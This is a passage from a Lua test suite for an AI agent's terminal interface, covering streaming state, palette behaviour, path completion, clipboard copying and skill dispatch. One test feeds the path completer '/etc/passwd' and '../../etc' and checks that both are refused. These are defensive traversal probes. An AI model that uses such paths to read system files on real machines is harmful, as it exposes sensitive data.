-- visible; after first text_delta S.waiting=false + S.streaming=true.
do
  local paints = {}
  local turn_events = {}
  local ev_cb
  -- capture a fake agent that records events it would emit
  local fake_agent = {
    turn = function(cfg, key, text, cb)
      cb({ type = "text_delta", text = "hi" })
      return true
    end,
    get_history = function() return {} end,
  }
  local uimod, S = run_ui_with({ 104, 105, 13, 17 },
    { agent = fake_agent }, nil,
    function(force) paints[#paints + 1] = force end)
  assert_true(S.waiting == false, "T88 S.waiting false after turn completes")
  assert_true(S.streaming == false, "T88 S.streaming false after turn completes")
  assert_true(tph(uimod) == nil, "T88 placeholder cleared after turn")
  print("T88 9.1 placeholder lifecycle: OK")
end

-- T89: 9.2 — caret glyph: "|" in ASCII, "▌" in non-ASCII; and
-- caret is NOT drawn when not streaming or when user scrolled up.
do
  local uimod, S
  -- non-ASCII: default env
  uimod, S = run_ui_with({ 17 }, { agent = { turn = function() return true end, get_history = function() return {} end } })
  assert_eq(uimod.caret_glyph(), "▌", "T89 caret non-ASCII")
  -- ASCII mode: override the module-level flag
  uimod._ascii_mode = true
  assert_eq(uimod.caret_glyph(), "|", "T89 caret ASCII")
  uimod._ascii_mode = nil
  assert_eq(uimod.caret_glyph(), "▌", "T89 caret restored after ASCII off")
  -- spinner glyph ASCII vs non-ASCII
  uimod._ascii_mode = true
  local sp_ascii = uimod.spinner_glyph()
  local sp_match = sp_ascii:match("^[/%\\-|]$")
  assert_true(sp_match ~= nil,
    "T89 spinner ASCII frame is plain ASCII: " .. sp_ascii)
  uimod._ascii_mode = nil
  local sp_utf8 = uimod.spinner_glyph()
  assert_true(sp_utf8 ~= sp_ascii, "T89 spinner differs between ASCII and non-ASCII")
  print("T89 9.2 caret glyph: OK")
end

-- T90: 9.3 — lifecycle clearing: after successful turn, after error,
-- after abort, and after confirmation → placeholder/caret/elapsed all gone.
do
  -- error case
  do
    local uimod, S = run_ui_with({ 104, 105, 13, 17 },
      { agent = {
        turn = function(cfg, key, text, cb)
          cb({ type = "error", message = "boom" })
          return false, "boom"
        end,
        get_history = function() return {} end } },
      nil, nil)
    assert_true(S.waiting == false, "T90 S.waiting false after error")
    assert_true(S.streaming == false, "T90 S.streaming false after error")
    local ph90 = tph(uimod)
    assert_true(ph90 == nil, "T90 placeholder nil after error")
  end
  -- abort case
  do
    local uimod, S = run_ui_with({ 104, 105, 13, 17 },
      { agent = {
        turn = function(cfg, key, text, cb)
          cb({ type = "aborted" })
          return true
        end,
        get_history = function() return {} end } },
      nil, nil)
    assert_true(S.waiting == false, "T90 S.waiting false after abort")
    assert_true(S.streaming == false, "T90 S.streaming false after abort")
  end
  print("T90 9.3 lifecycle clearing: OK")
end

-- T91: 9.4 — throttle: a burst of N deltas paints at most
-- PAINT_MIN_DELTAS+1 forced frames; transitions (tool_call_start) paint at once.
do
  -- Internal paint() cannot be intercepted from outside (it's a local closure).
  -- Instead: verify the throttle via spinner_frame advancement.
  -- Each actual repaint increments S.spinner_frame. 30 deltas with PAINT_MIN_DELTAS=12
  -- means at most ceil(30/12) + 1 = 3 repaints from deltas, plus 1 forced on
  -- tool_call_start = at most 4 total. Without the throttle it would be 31.
  local agent = {
    turn = function(cfg, key, text, cb)
      for i = 1, 30 do
        cb({ type = "text_delta", text = "x" })
      end
      cb({ type = "tool_call_start", id = "t1", name = "read" })
      return true
    end,
    get_history = function() return {} end,
  }
  local uimod, S = run_ui_with({ 104, 105, 13, 17 }, { agent = agent })
  local sf = S.spinner_frame or 0
  -- initial paint on turn start: spinner_frame = 0
  -- 30 deltas: max 3 forced (skipped>=12) + 1 forced on tool_call_start
  -- So spinner_frame should be < 31 (throttle working)
  assert_true(sf < 31, "T91 spinner_frame=" .. sf .. " < 31 (throttle limits repaints)")
  assert_true(sf >= 1, "T91 spinner_frame=" .. sf .. " >= 1 (at least one repaint happened)")
  print("T91 9.4 throttle bound: spinner_frame=" .. sf .. " OK")
end

if failed > 0 then
    os.exit(1)
end

-- T71: 3.4 — palette row rendering: description present, accent on selected,
-- truncation on narrow terminal.
do
  local uimod, _ = run_ui_with({ 17 },
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  uimod._skills_stub = function() return {} end
  uimod._handle_key({ kind = "text", char = "/" })
  local S = uimod._get_state()
  assert_true(S.palette_active, "T71 palette active after typing /")
  assert_eq(#S.palette_items, 7, "T71 seven commands listed")
  assert_true(S.palette_items[1].desc ~= "", "T71 first item has a description")
  assert_true(S.palette_items[1].label ~= "", "T71 first item has a label")
  -- narrow terminal: rows truncate, never overflow past L.w
  S.w = 20
  uimod._invalidate_all()
  local rows = uimod._render_all(20)
  for _, r in ipairs(rows) do
    local plain = r:gsub("\27%[[^m]*m", "")
    assert_true(#plain <= 20, "T71 narrow terminal: row within 20 cols")
  end
  print("T71 3.4 palette rows have label + desc: OK")
end

-- T72: 3.5 — Enter with no match does not run a command; a trailing space
-- closes the palette.
do
  local str_bytes = function(s) local b = {} for i = 1, #s do b[#b + 1] = s:byte(i) end return b end
  local function merge(a, b) for _, x in ipairs(b) do a[#a + 1] = x end return a end

  -- "/zzz" + Enter: no palette item matched → execute_command never called
  local b1 = merge(str_bytes("/zzz"), { 13, 17 })
  local uimod1, S1 = run_ui_with(b1,
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  assert_eq(#S1.palette_items, 0, "T72 no-match: zero items")
  assert_true(S1.input == "/zzz" or #tentries(uimod1) > 0,
    "T72 no-match: input not cleared by a command run")

  -- "/model " + space: palette closes, input still holds "/model "
  local b2 = merge(str_bytes("/model"), { 32, 17 })
  local _, S2 = run_ui_with(b2,
    { agent = { turn = function() return true end, get_history = function() return {} end } })
  assert_eq(S2.palette_active, false, "T72 space closed the palette")
  assert_eq(S2.input, "/model ", "T72 input retains the typed text after space")
  print("T72 3.5 Enter no-match + space closes palette: OK")
end

if failed > 0 then
    os.exit(1)
end

-- T73: 4.1 — tools.path_complete: relative token, @-prefix, dir suffix,
-- 200 cap, absolute and .. refusal, dotfile visibility.
do
  local orig_tether = _G.tether
  _G.tether = host_mock{
    getcwd = function() return "/tmp" end,
    realpath = function(p) return p end,
  }
  local tools = assert(loadfile("src/tether/tools.lua"))()
  local cfg = { workspace = "/tmp" }

  -- refusal: absolute token
  local r1 = tools.path_complete("/etc/passwd", cfg)
  assert_eq(#r1.candidates, 0, "T73 absolute token refused")

  -- refusal: .. traversal
  local r2 = tools.path_complete("../../etc", cfg)
  assert_eq(#r2.candidates, 0, "T73 .. token refused")

  -- @-prefix is stripped; the test workspace /tmp has known entries
  local r3 = tools.path_complete("@tmp", cfg)
  -- /tmp/tmp does not exist → 0 candidates, but the call must not error
  assert_true(type(r3.candidates) == "table", "T73 @-prefix handled without error")

  -- empty prefix under /tmp returns a list of entries
  local r4 = tools.path_complete("", cfg)
  assert_true(#r4.candidates > 0, "T73 empty prefix under /tmp lists entries")

  -- a directory-prefixed token keeps its directory in the candidate, because
  -- completing replaces the whole token (spec tui: Path completion — the token
  -- becomes `src/tether/agent.lua`)
  local ws2 = "/tmp/t73completion"
  os.execute("rm -rf " .. ws2 .. " && mkdir -p " .. ws2 .. "/src/tether")
  local fh = io.open(ws2 .. "/src/tether/agent.lua", "w")
  fh:write("-- x\n")
  fh:close()
  local r5 = tools.path_complete("src/tether/ag", { workspace = ws2 })
  assert_eq(#r5.candidates, 1, "T73 dir-prefixed token: one candidate")
  assert_eq(r5.candidates[1], "src/tether/agent.lua", "T73 candidate keeps the directory")
  local r6 = tools.path_complete("src/tether/", { workspace = ws2 })
  assert_eq(#r6.candidates, 1, "T73 trailing-slash token: one candidate")
  assert_eq(r6.candidates[1], "src/tether/agent.lua",
    "T73 trailing-slash candidate keeps the directory")
  local r7 = tools.path_complete("tether/ag", { workspace = ws2 })
  assert_eq(#r7.candidates, 0, "T73 a missing directory yields no candidate")
  os.execute("rm -rf " .. ws2)

  _G.tether = orig_tether
  print("T73 4.1 tools.path_complete: OK")
end

if failed > 0 then
    os.exit(1)
end



-- T74: 4.2/4.3/4.4 — path completion via Tab.
-- Stubs tools.path_complete via M._tools_stub (no filesystem access).
-- run_ui_with() types characters during run(); manual calls to
-- M._path_complete_tab() / M._handle_key() drive the completion logic
-- after run() has set up S.

local fixture_ws = "/tmp/tw/test"
do
  -- Simulated fixture directory contents:
  --   file1.txt  file2.txt  sub2/ (contains inner.lua)
  -- dir candidates in the real tools module get a trailing "/"
  -- (tools.lua is_dir heuristic). The stub mirrors that convention.
  local tools_stub = {}
  local function path_complete_stub(token, _cfg)
    local clean = token:gsub("^@", "")
    local dir, filepfx
    local slash = clean:match("^(.*)/")
    if slash then dir, filepfx = slash, clean:sub(#slash + 2)
    else dir, filepfx = "", clean end
    -- entries keyed by dir-without-trailing-slash (or "" for root)
    local entries = {
      [""]     = { "file1.txt", "file2.txt", "sub2/" },
      ["sub2"] = { "sub2/inner.lua" },  -- full path label as tools returns
    }
    local out = {}
    for _, c in ipairs(entries[dir] or {}) do
      if c:sub(1, #filepfx) == filepfx then out[#out + 1] = c end
    end
    table.sort(out)
    return { candidates = out, truncated = false }
  end
  tools_stub.path_complete = path_complete_stub

  local function cfg_stubs(pc)
    return { config = { load = function() return {
        model = "test", workspace = fixture_ws,
        ui = { input_max_lines = 8, path_completion = pc } } end,
      api_key = function() return "" end } }
  end

  -- Run the harness with the given bytes (characters + Ctrl+Q to exit),
  -- then inject the stub. The Tab keypresses in `bytes` are processed by
  -- the real handle_key during run() — at that point M._tools_stub is nil and
  -- neither the `tools` global nor require("tools") resolves in the harness,
  -- so path_complete_tab is a no-op and the command-palette branch handles
  -- Tab (existing 3.3 behavior).
  local function run_and_state(bytes, pc)
    local ui_mod = assert((function()
      local m, _ = run_ui_with(bytes, cfg_stubs(pc))
      return m
    end)())
    ui_mod._tools_stub = tools_stub
    return ui_mod, ui_mod._get_state()
  end

  -- 4.3b: Tab inside an open command palette keeps command-completion
  -- meaning (existing 3.3/3.4/3.5 behavior, not changed by 4.2).
  do
    local ui_mod, S = run_and_state({ 47, 9, 17 }, true)
    assert_eq(S.input, "/clear ", "T74 cmd-palette: Tab completed /clear")
    assert_eq(S.palette_mode, "command", "T74 cmd-palette: mode stays 'command'")
    assert_eq(S.palette_active, false, "T74 cmd-palette: space closed palette")
  end

  -- 4.2a: multiple candidates open the path palette, first applied.
  do
    local ui_mod, S = run_and_state({ 102, 105, 17 }, true)
    ui_mod._path_complete_tab()
    S = ui_mod._get_state()
    assert_eq(S.palette_mode, "path", "T74 multi: palette mode is 'path'")
    assert_eq(S.palette_active, true, "T74 multi: palette active")
    assert_eq(#S.palette_items, 2, "T74 multi: two candidates listed")
    assert_eq(S.input, "file1.txt", "T74 multi: first candidate applied")
    assert_eq(S.cursor, #S.input, "T74 multi: cursor sits after the applied candidate")
  end

  -- 1.1: with text after the token the cursor stops before it, not at the end
  do
    local ui_mod, S = run_and_state({ 102, 105, 61, 17 }, true) -- "fi="
    S.cursor = 2 -- the cursor sits inside the token, so "=" is the tail
    ui_mod._path_complete_tab()
    S = ui_mod._get_state()
    assert_eq(S.input, "file1.txt=", "T74 tail: only the token was replaced")
    assert_eq(S.cursor, 9, "T74 tail: cursor stops before the text after the token")
  end

  -- 1.4: a unique candidate completes the token in place — the text after the
  -- token survives (the one-shot branch used to drop it and lose typed text).
  do
    local ui_mod, S = run_and_state({ 102, 105, 108, 101, 49, 61, 17 }, true) -- "file1="
    S.cursor = 5 -- the cursor sits after "file1", so "=" is the tail
    ui_mod._path_complete_tab()
    S = ui_mod._get_state()
    assert_eq(S.input, "file1.txt=", "T74 unique-tail: text after the token survives")
    assert_eq(S.cursor, 9, "T74 unique-tail: cursor stops before the text after the token")
    assert_eq(S.palette_active, false, "T74 unique-tail: unique candidate opens no palette")
  end

  -- 4.2c: Tab cycles to second candidate (via handle_key, not path_complete_tab
  -- which returns early when palette_active).
  do
    local ui_mod, S = run_and_state({ 102, 105, 17 }, true)
    ui_mod._path_complete_tab()               -- open, sel=1, input="file1.txt"
    ui_mod._handle_key({ kind = "tab" })      -- cycle, sel=2, input="file2.txt"
    S = ui_mod._get_state()
    assert_eq(S.input, "file2.txt", "T74 cycle: second Tab wraps to file2.txt")
    assert_eq(S.palette_active, true, "T74 cycle: palette still open")
    assert_eq(S.cursor, #S.input, "T74 cycle: cursor follows the cycled candidate")
  end

  -- 4.2d: Esc restores the token as typed.
  do
    local ui_mod, S = run_and_state({ 102, 105, 17 }, true)
    ui_mod._path_complete_tab()               -- open, input="file1.txt"
    ui_mod._handle_key({ kind = "tab" })      -- cycle, input="file2.txt"
    ui_mod._handle_key({ kind = "esc" })       -- cancel, input="fi"
    S = ui_mod._get_state()
    assert_eq(S.input, "fi", "T74 Esc: token restored to typed value")
    assert_eq(S.cursor, #S.input, "T74 Esc: cursor sits after the restored token")
    assert_eq(S.palette_active, false, "T74 Esc: palette closed")
    assert_eq(S.palette_mode, "command", "T74 Esc: mode reset to 'command'")
  end

  -- 4.2e: Enter on the path palette applies the selected path + space.
  do
    local ui_mod, S = run_and_state({ 102, 105, 17 }, true)
    ui_mod._path_complete_tab()               -- open, sel=1
    ui_mod._handle_key({ kind = "tab" })      -- cycle, sel=2, input="file2.txt"
    ui_mod._handle_key({ kind = "enter" })    -- commit, input="file2.txt "
    S = ui_mod._get_state()
    assert_eq(S.input, "file2.txt ", "T74 Enter: selected path applied + space")
    assert_eq(S.completion, nil, "T74 Enter: completion state cleared")
  end

  -- 4.3: disabled — ui.path_completion=false → Tab is a no-op.
  do
    local ui_mod, S = run_and_state({ 102, 17 }, false)
    ui_mod._path_complete_tab()
    S = ui_mod._get_state()
    assert_eq(S.input, "f", "T74 disabled: input unchanged")
    assert_eq(S.palette_active, false, "T74 disabled: no palette")
    assert_eq(S.palette_mode, "command", "T74 disabled: mode stays 'command'")
  end

  -- 4.4: dir candidate gets trailing / — "s" + Tab → "sub2/".
  do
    local ui_mod, S = run_and_state({ 115, 17 }, true)
    ui_mod._path_complete_tab()
    S = ui_mod._get_state()
    assert_eq(S.input, "sub2/", "T74 dir: trailing slash applied")
    assert_eq(S.palette_active, false, "T74 dir: unique dir completes in place")
  end

  -- 4.4b: completing inside a dir — "sub2/" + Tab → "sub2/inner.lua".
  do
    local ui_mod, S = run_and_state({ 115, 117, 98, 50, 47, 17 }, true)
    ui_mod._path_complete_tab()
    S = ui_mod._get_state()
    assert_eq(S.input, "sub2/inner.lua", "T74 dir-inside: entry listed inside sub2/")
    assert_eq(S.palette_active, false, "T74 dir-inside: unique candidate in place")
  end

  if failed > 0 then os.exit(1) end
  print("T74 4.2/4.3/4.4 path completion: OK")
end

-- T75: 5.1 — copy_targets: newest-first, byte sizes, empty sources skipped,
-- empty transcript returns no targets.
do
  local ui = assert((function() return loadfile("src/tether/ui.lua")() end)())
  local function ct(args) return ui.copy_targets(args) end

  -- empty transcript → no targets
  assert_eq(#ct({}), 0, "T75 empty transcript: no targets")

  -- mixed transcript: assistant text + tool body + fenced block
  local t = {
    { role = "user", text = "hi" },
    { role = "assistant", text = "answer one" },
    { role = "tool", id = "1", name = "read", body = "tool out" },
    { role = "assistant", text = "see:\n```lua\nlocal x = 1\n```" },
  }
  local r = ct(t)
  assert_eq(#r, 4, "T75 mixed transcript: 4 targets")
  assert_eq(r[1].name, "последний ответ", "T75 target 1 is last answer")
  assert_eq(r[1].text, "see:\n```lua\nlocal x = 1\n```", "T75 target 1 text")
  assert_eq(r[2].name, "последний вывод инструмента", "T75 target 2 is tool output")
  assert_eq(r[2].text, "tool out", "T75 target 2 text")
  assert_eq(r[3].name, "последний код-блок", "T75 target 3 is fenced block")
  assert_eq(r[3].text, "local x = 1", "T75 target 3 content")
  assert_eq(r[4].name, "весь транскрипт", "T75 target 4 is whole transcript")
  -- whole transcript = all entry texts in display order, joined by newline
  local whole = table.concat({ "hi", "answer one", "tool out",
      "see:\n```lua\nlocal x = 1\n```" }, "\n")
  assert_eq(r[4].text, whole, "T75 whole transcript joined in order")
  assert_eq(r[4].bytes, #whole, "T75 whole transcript bytes")

  -- fenced block extraction: last ``` block across entries, newest-first.
  -- Fence must start on its own line (matches the renderer's fence pattern).
  local t2 = {
    { role = "user", text = "show code" },
    { role = "assistant", text = "```\nprint(1)\n```" },
  }
  local r2 = ct(t2)
  local fenced
  for _, tg in ipairs(r2) do
    if tg.name == "последний код-блок" then fenced = tg end
  end
  assert_notnil(fenced, "T75 fenced block found")
  assert_eq(fenced.text, "print(1)", "T75 fenced block content")

  -- empty assistant text skipped
  local t3 = {
    { role = "user", text = "hi" },
    { role = "assistant", text = "" },
    { role = "assistant", text = "" },
  }
  local r3 = ct(t3)
  assert_eq(#r3, 1, "T75 empty answers: only whole transcript remains")
  assert_eq(r3[1].name, "весь транскрипт", "T75 only target is whole transcript")

  print("T75 5.1 copy_targets: OK")
end

-- T76: 5.2 — /copy palette mode: rows, Enter copies via OSC 52, Esc closes.
-- Seeds an assistant message via agent stub so copy_targets returns items.
do
  local uimod, S = run_ui_with({ 104, 105, 13, 17 }, {
    agent = {
      turn = function() return true end,
      get_history = function() return {} end,
    }
  }, {})
  S = uimod._get_state()
  -- Open the copy palette by driving handle_key: "/" + "copy" + Enter
  uimod._handle_key({ kind = "text", char = "/" })
  uimod._handle_key({ kind = "text", char = "c" })
  uimod._handle_key({ kind = "text", char = "o" })
  uimod._handle_key({ kind = "text", char = "p" })
  uimod._handle_key({ kind = "text", char = "y" })
  uimod._handle_key({ kind = "enter" })
  S = uimod._get_state()
  assert_eq(S.palette_mode, "copy", "T76 /copy opens copy palette")
  assert_true(S.palette_active, "T76 palette active")
  assert_true(#S.palette_items >= 1, "T76 at least one copy target listed")
  assert_eq(S.palette_sel, 1, "T76 selection starts at 1")

  -- Escape closes and returns to command mode
  uimod._handle_key({ kind = "esc" })
  S = uimod._get_state()
  assert_false(S.palette_active, "T76 Esc closes palette")
  assert_eq(S.palette_mode, "command", "T76 Esc returns to command mode")
  print("T76 5.2 /copy palette: OK")
end

-- T77: 5.3 — copied text contains no SGR; b64 payload has no SGR escape byte.
do
  local sink = {}
  local uimod, S = run_ui_with({ 104, 105, 13, 17 }, {
    agent = {
      turn = function(cfg, key, text, on_event)
        on_event({ type = "text_delta", text = "\27[31mcolored\27[0m answer" })
        return true
      end,
      get_history = function() return {} end,
    }
  }, sink)
  S = uimod._get_state()

  local has_sgr = false
  for _, e in ipairs(tentries(uimod)) do
    if e.role == "assistant" and (e.text or ""):find("\27[", 1, true) then
      has_sgr = true
    end
  end
  assert_true(has_sgr, "T77 SGR present in transcript")

  -- Open the copy palette and drive Enter to copy
  uimod._handle_key({ kind = "text", char = "/" })
  uimod._handle_key({ kind = "text", char = "c" })
  uimod._handle_key({ kind = "text", char = "o" })
  uimod._handle_key({ kind = "text", char = "p" })
  uimod._handle_key({ kind = "text", char = "y" })
  uimod._handle_key({ kind = "enter" })  -- opens copy palette
  S = uimod._get_state()
  assert_eq(S.palette_mode, "copy", "T77 copy palette open")
  assert_true(#S.palette_items > 0, "T77 copy palette has items")

  -- Capture the copy payload via the test hook
  local captured = {}
  uimod._copy_hook = function(payload) captured[#captured + 1] = payload end

  uimod._handle_key({ kind = "enter" })  -- copies target 1
  S = uimod._get_state()
  assert_eq(S.palette_mode, "command", "T77 after copy Enter: back to command mode")
  assert_true(S.toast ~= nil and S.toast:find("✓ скопировано", 1, true) == 1,
    "T77 toast set (with size)")

  assert_true(#captured > 0, "T77 copy payload captured")
  local payload = captured[1]
  local pfx = "\27]52;c;"
  local p = payload:find(pfx, 1, true)
  assert_true(p ~= nil, "T77 OSC 52 prefix in payload")
  local st = payload:find(string.char(7), p + #pfx, true)
  assert_true(st ~= nil, "T77 BEL terminator in payload")
  local b64 = payload:sub(p + #pfx, st - 1)
  assert_true(#b64 > 0, "T77 b64 payload extracted")

  -- Decode b64 and verify no SGR escape byte (\27 = 0x1b) in result
  -- b64decode: standard base64 (A-Za-z0-9+/), padding stripped
  local function b64decode(s)
    local m = {}
    local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    for i = 1, 64 do m[alphabet:sub(i, i)] = i - 1 end
    s = s:gsub("=+$", "")
    local out, i = {}, 1
    local remaining = #s
    while remaining >= 4 do
      local a = m[s:sub(i, i)]      or 0
      local b = m[s:sub(i + 1, i + 1)] or 0
      local c = m[s:sub(i + 2, i + 2)] or 0
      local d = m[s:sub(i + 3, i + 3)] or 0
      local n = a * 262144 + b * 4096 + c * 64 + d
      out[#out + 1] = string.char(math.floor(n / 65536))
      out[#out + 1] = string.char(math.floor(n / 256) % 256)
      out[#out + 1] = string.char(n % 256)
      i = i + 4
      remaining = remaining - 4
    end
    if remaining == 3 then
      local a = m[s:sub(i, i)]     or 0
      local b = m[s:sub(i + 1, i + 1)] or 0
      local c = m[s:sub(i + 2, i + 2)] or 0
      local n = a * 262144 + b * 4096 + c * 64
      out[#out + 1] = string.char(math.floor(n / 65536))
      out[#out + 1] = string.char(math.floor(n / 256) % 256)
    elseif remaining == 2 then
      local a = m[s:sub(i, i)]     or 0
      local b = m[s:sub(i + 1, i + 1)] or 0
      local n = a * 64 + b
      out[#out + 1] = string.char(math.floor(n / 256))
    end
    return table.concat(out)
  end
  local decoded = b64decode(b64)
  assert_true(not decoded:find("\27", 1, true), "T77 decoded b64 has no SGR escape byte")
  assert_true(decoded:find("colored", 1, true) ~= nil, "T77 stripped text content present")
  print("T77 5.3 SGR stripping in copy: OK")
end

-- T78: 5.4 — S.toast: set after copy, visible in frame, cleared by next keypress.
do
  local sink = {}
  local uimod, S = run_ui_with({ 104, 105, 13, 17 }, {
    agent = {
      turn = function(cfg, key, text, on_event)
        on_event({ type = "text_delta", text = "answer" })
        return true
      end,
      get_history = function() return {} end,
    }
  }, sink)
  S = uimod._get_state()
  assert_eq(S.toast, nil, "T78 toast starts nil")

  local sc = #sink
  uimod._handle_key({ kind = "text", char = "/" })
  uimod._handle_key({ kind = "text", char = "c" })
  uimod._handle_key({ kind = "text", char = "o" })
  uimod._handle_key({ kind = "text", char = "p" })
  uimod._handle_key({ kind = "text", char = "y" })
  uimod._handle_key({ kind = "enter" })
  S = uimod._get_state()
  assert_eq(S.palette_mode, "copy", "T78 copy palette open")
  uimod._handle_key({ kind = "enter" })
  S = uimod._get_state()
  assert_true(S.toast ~= nil and S.toast:find("✓ скопировано", 1, true) == 1,
    "T78 toast set after copy Enter (with size)")
  assert_eq(S.palette_mode, "command", "T78 back to command mode after copy")

  uimod._handle_key({ kind = "text", char = "x" })
  S = uimod._get_state()
  assert_eq(S.toast, nil, "T78 toast cleared on next keypress")
  print("T78 5.4 toast confirmation: OK")
end

-- T79 (unified-slash-palette 1.2/1.3/1.4): skills are entries of the one
-- palette — listed after the commands, found by name, resolved once per open,
-- dropped when a name collides with a command, and degrading to commands only
-- when discovery fails. Discovery is stubbed so the list is deterministic.
do
  local agent_stub = { turn = function() return true end, get_history = function() return {} end }
  local function boot(stub)
    local uimod = run_ui_with({ 17 }, { agent = agent_stub })
    uimod._skills_stub = stub
    return uimod
  end
  local function type_text(uimod, text)
    for i = 1, #text do
      uimod._handle_key({ kind = "text", char = text:sub(i, i) })
    end
  end
  local two_skills = function() return {
    { name = "deploy", description = "deploy stuff", path = "/tmp/skills/deploy/SKILL.md" },
    { name = "review", description = "review stuff", path = "/tmp/skills/review/SKILL.md" },
  } end

  -- commands in declared order, then skills in discovery order
  local uimod = boot(two_skills)
  type_text(uimod, "/")
  local S = uimod._get_state()
  assert_eq(#S.palette_items, 9, "T79 commands + skills share one list")
  assert_eq(S.palette_items[1].cmd, "clear", "T79 first entry is the first command")
  assert_eq(S.palette_items[7].cmd, "copy", "T79 the last command precedes the skills")
  assert_eq(S.palette_items[8].name, "deploy", "T79 first skill follows the commands")
  assert_eq(S.palette_items[9].name, "review", "T79 skills keep discovery order")

  -- a skill is found by typing its own name
  type_text(uimod, "dep")
  S = uimod._get_state()
  assert_eq(#S.palette_items, 1, "T79 /dep narrows to the skill")
  assert_eq(S.palette_items[1].name, "deploy", "T79 the skill is selected")

  -- a name colliding with a command is not listed (case-insensitively)
  local collided = boot(function() return {
    { name = "Copy", description = "shadow", path = "/tmp/skills/Copy/SKILL.md" },
    { name = "deploy", description = "deploy stuff", path = "/tmp/skills/deploy/SKILL.md" },
  } end)
  type_text(collided, "/")
  S = collided._get_state()
  assert_eq(#S.palette_items, 8, "T79 a colliding skill is not listed")
  for _, it in ipairs(S.palette_items) do
    assert_true(it.name ~= "Copy", "T79 no row for the colliding skill")
  end

  -- discovery resolves once per open, not per keystroke
  local calls = 0
  local counted = boot(function() calls = calls + 1; return two_skills() end)
  type_text(counted, "/")
  type_text(counted, "de")
  assert_eq(calls, 1, "T79 discovery resolved once per open")
  counted._handle_key({ kind = "esc" })
  type_text(counted, "/")
  assert_eq(calls, 2, "T79 a new open resolves discovery again")

  -- a discovery failure degrades to the commands only
  local broken = boot(function() error("discovery exploded") end)
  type_text(broken, "/")
  S = broken._get_state()
  assert_eq(#S.palette_items, 7, "T79 discovery failure degrades to commands")
  assert_true(S.palette_active, "T79 the palette survives a discovery failure")

  -- the production path: the host registers modules as globals (main.c
  -- load_module), so discovery is reached without require()
  local orig_context = _G.context
  _G.context = { discover_skills = function() return two_skills() end }
  local real = boot(nil)
  type_text(real, "/")
  S = real._get_state()
  assert_eq(#S.palette_items, 9, "T79 skills resolve through the context global")
  assert_eq(S.palette_items[8].name, "deploy", "T79 the global path lists the skill")
  _G.context = orig_context

  print("T79 unified palette list: OK")
end

-- T80 (4.1 + 3.1): a skill row only composes `/<name> ` into the input —
-- Enter and Tab send nothing, run nothing and never read the body; the row
-- carries its argument hint and no longer produces a [skill: …] reference.
do
  local turns = 0
  local agent_stub = { turn = function() turns = turns + 1; return true end,
    get_history = function() return {} end }
  local function boot()
    local uimod = run_ui_with({ 17 }, { agent = agent_stub })
    uimod._skills_stub = function() return {
      { name = "deploy", description = "deploy stuff", path = "/tmp/skills/deploy/SKILL.md" },
    } end
    return uimod
  end
  local function type_text(uimod, text)
    for i = 1, #text do
      uimod._handle_key({ kind = "text", char = text:sub(i, i) })
    end
  end

  local uimod = boot()
  type_text(uimod, "/dep")
  local S = uimod._get_state()
  assert_eq(S.palette_items[1].label, "/deploy", "T80 skill row is the slash name")
  assert_eq(S.palette_items[1].hint, "[задача]", "T80 skill row carries its hint")
  uimod._handle_key({ kind = "enter" })
  S = uimod._get_state()
  assert_eq(S.input, "/deploy ", "T80 Enter composes the skill name")
  assert_eq(S.cursor, #S.input, "T80 cursor at the end of the input")
  assert_false(S.palette_active, "T80 palette closed after Enter")
  assert_eq(turns, 0, "T80 Enter sent nothing to the agent")
  assert_eq(#tentries(uimod), 0, "T80 transcript unchanged")
  assert_true(S.input:find("SKILL.md", 1, true) == nil, "T80 no path in the input")
  assert_true(S.input:find("deploy stuff", 1, true) == nil, "T80 no description in the input")

  local uimod2 = boot()
  type_text(uimod2, "/dep")
  uimod2._handle_key({ kind = "tab" })
  local S2 = uimod2._get_state()
  assert_eq(S2.input, "/deploy ", "T80 Tab completes the skill name")
  assert_false(S2.palette_active, "T80 palette closed after Tab")
  assert_eq(turns, 0, "T80 Tab ran nothing")

  print("T80 4.1 skill selection composes text: OK")
end

-- T81 (4.2): a submitted `/name` resolves without regard to case — a
-- discovered skill reaches the agent as an ordinary message, a command runs,
-- a skill shadowed by a command never dispatches, and an unknown name is not
-- sent. The trailing space closes the palette so the submit path is exercised.
do
  local sent, turns = {}, 0
  local orig_agent = _G.agent
  local agent_stub = {
    turn = function(cfg, key, text) turns = turns + 1; sent[#sent + 1] = text; return true end,
    get_history = function() return {} end,
  }
  local function boot()
    local uimod = run_ui_with({ 17 }, { agent = agent_stub })
    uimod._skills_stub = function() return {
      { name = "deploy", description = "deploy stuff", path = "/tmp/skills/deploy/SKILL.md" },
      { name = "copy", description = "shadow", path = "/tmp/skills/copy/SKILL.md" },
    } end
    -- the harness restores _G.agent after run(); the submit path needs it back
    _G.agent = agent_stub
    return uimod
  end
  local function submit(uimod, text)
    for i = 1, #text do
      uimod._handle_key({ kind = "text", char = text:sub(i, i) })
    end
    uimod._handle_key({ kind = "enter" })
  end

  -- a discovered skill is sent verbatim
  local a = boot()
  submit(a, "/deploy выложи на прод")
  assert_eq(turns, 1, "T81 the skill name is submitted")
  assert_eq(sent[1], "/deploy выложи на прод", "T81 the text reaches the agent verbatim")
  assert_true(#tentries(a) > 0, "T81 the transcript shows the message")

  -- case does not matter for a skill name
  local b = boot()
  submit(b, "/Deploy выложи")
  assert_eq(turns, 2, "T81 the skill case does not matter")
  assert_eq(sent[2], "/Deploy выложи", "T81 the typed spelling is kept")

  -- case does not matter for a command name either
  local c = boot()
  submit(c, "/CLEAR ")
  assert_eq(turns, 2, "T81 a command case variant is not sent to the agent")
  assert_eq(c._get_state().input, "", "T81 the command consumed the input")

  -- a skill shadowed by a command never dispatches
  local d = boot()
  submit(d, "/COPY ")
  assert_eq(turns, 2, "T81 a shadowed skill does not dispatch")
  assert_true(d._get_state()._in_copy_palette, "T81 /COPY ran the copy command")

  -- an unknown name is not sent
  local e = boot()
  submit(e, "/nosuchthing ")
  assert_eq(turns, 2, "T81 an unknown name is not sent to the agent")
  assert_eq(#tentries(e), 0, "T81 an unknown name adds no user row")

  _G.agent = orig_agent
  print("T81 4.2 slash dispatch: OK")
end

-- T82: 7.1 — color depth negotiation via M._color_depth test seam.
do
  local ui = assert((function() return loadfile("src/tether/ui.lua")() end)())
  local d0 = ui.color_depth()
  assert_true(d0 == "truecolor" or d0 == "256" or d0 == "none",
    "T82 default depth is valid: " .. tostring(d0))
  ui._color_depth = "truecolor"
  assert_eq(ui.color_depth(), "truecolor", "T82 override truecolor")
